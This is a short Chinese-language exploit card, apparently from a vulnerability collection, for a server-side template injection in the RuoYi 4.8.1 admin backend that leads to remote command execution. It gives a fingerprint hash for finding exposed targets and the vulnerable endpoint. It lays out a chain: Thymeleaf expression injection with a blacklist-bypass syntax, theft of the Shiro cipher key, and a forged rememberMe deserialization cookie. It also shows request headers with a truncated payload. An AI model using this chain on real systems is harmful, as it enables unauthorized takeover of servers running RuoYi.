# 若依(RuoYi)4.8.1后台SSTI漏洞（可RCE）

- **系统**：若依　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`icon_hash="706913071"`
- **请求**：`POST /monitor/cache/getNames HTTP/1.1`

**请求体 / payload**
```
攻击流程：
发现SSTI漏洞：通过fragment参数注入Thymeleaf表达式
绕过黑名单：使用__$${...}__::.x格式绕过关键字过滤
获取Shiro密钥：利用SSTI读取securityManager.rememberMeManager.cipherKeyShiro
反序列化：使用获取的密钥构造RememberMe Cookie
实现RCE：通过Shiro反序列化链执行任意命令
Host:
X-Requested-With: XMLHttpRequest
X-CSRF-Token: JxbJuBkF+1WQAMT3u9i/sqsagEKm7GsXWD+mebzkmhs=
Cookie: JSESSIONID=feec2fcc-209b-480c-b2bd-fedc510d91f7; rememberMe=I2GmgSYtyNGDyq1HsJ4YHgph/+dyRGZwHYkWpgOlqA5X91Ex2wqDGuoQ4InuD3UHPqK4BsweNaxbyCxLl//D0TgqRZ23P/fQf0YLVCL1NQjAvqMfU39DQrwL7oTgQ+elDrE2t6oFyEPnF9e7liIwH/1F3ZlMKP9UxdsDZ/bJeUGBcCcd94OJosRMkLz7XMa5L5H4ai/kbH+JU/qtUL3a1F4QUzayzAFqVNlxU5g8W6K…（脚本共 3474 字，完整版见原文）
```
- **预期**：200　|　—